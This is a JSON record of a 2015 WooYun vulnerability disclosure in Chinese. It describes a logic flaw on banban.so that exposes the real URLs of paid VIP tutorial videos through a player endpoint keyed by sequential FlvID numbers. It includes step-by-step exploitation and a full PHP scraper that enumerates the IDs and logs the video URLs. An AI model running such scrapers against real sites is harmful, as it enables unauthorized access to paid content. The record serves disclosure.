{"id": 82359, "wybug_id": "wooyun-2015-0151333", "wybug_title": "DZ棒棒团某功能设计逻辑缺陷（可免费观看VIP视频）", "wybug_corp": "dz棒棒团", "wybug_author": "路人甲", "wybug_date": "2015-11-03 13:07", "wybug_open_date": "2015-12-18 13:08", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "低", "wybug_rank_0": "2", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["视频泄露", "视频地址遍历"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-11-03：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-12-18：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： DZ棒棒团某功能设计逻辑缺陷，无需登录（可免费观看VIP视频） 详细说明：  班班网是一家discuz教程为主的在线教程网站，vip收费要好几千块钱，不小心获取到vip视频了。班班网用的是极酷阳光播放器，打开一个免费视频用谷歌浏览器查看network视频加载\n\n发现免费教程视频路径http://www.banban.so/data/attachment/v/bbtuploaducanneverimagine/2015091501.mp4打开一个vip视频教程\n\n发现路径http://www.banban.so/data/attachment/vpreview/vyulanbbt/059.mp4右键源代码可以看到播放器的js代码，记住FlvID=XXX\n\n极酷阳光播放器有个文件/Player/CuSunV2Set.php打开www.banban.so/player/CuSunV2set.php?FlvID=444右键查看源代码\n\n可以看到视频的真实路径啦下面写了个php自动扫描获取的，\n<?php$id = $_GET['id'] + 1;//3秒自动刷新$a = '<meta http-equiv=\"refresh\" content=\"3; ';$b = \"url=index.php?id={$id}\\\">\";echo $a . $b;//vip视频播放器地址$url = 'http://www.banban.so/player/CuSunV2set.php?FlvID=' . $id;echo $url;//字符串截取函数function strCutByStr(&$str, $findStart, $findEnd = false, $encoding = 'utf-8'){    if (is_array($findStart)) {        if (count($findStart) === count($findEnd)) {            foreach ($findStart as $k => $v) {                if (($result = strCutByStr($str, $v, $findEnd[$k], $encoding)) !== false) {                    return $result;                }            }            return false;        } else {            return false;        }    }    if (($start = mb_strpos($str, $findStart, 0, $encoding)) === false) {        return false;    }    $start += mb_strlen($findStart, $encoding);    if ($findEnd === false) {        return mb_substr($str, $start, NULL, $encoding);    }    if (($length = mb_strpos($str, $findEnd, $start, $encoding)) === false) {        return false;    }    return mb_substr($str, $start, $length - $start, $encoding);}//获取vip视频mp4真实地址$str = file_get_contents($url);$v = strCutByStr($str, '../data/attachment/v/bbtuploaducanneverimagine/..', '.mp4') . \".mp4\" . \"\\r\\n\" . \"\\r\\n\";$v = 'http://www.banban.so' . $v;//保存获取到的视频真实地址到file.txt$filename = 'file.txt';$fh = fopen($filename, 'a');fwrite($fh, $v);echo '成功';fclose($fh);?>\n然后浏览器输入一个起始扫描地址http://www.banban.so/player/CuSunV2set.php?FlvID=1让他扫起来~~剩下的不说了 看代码吧~   漏洞证明：  这个就是批量获取到的vip视频地址啦\n\n   修复方案：  改下那个php文件名？自己修复下吧，俺是新手，不懂~   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}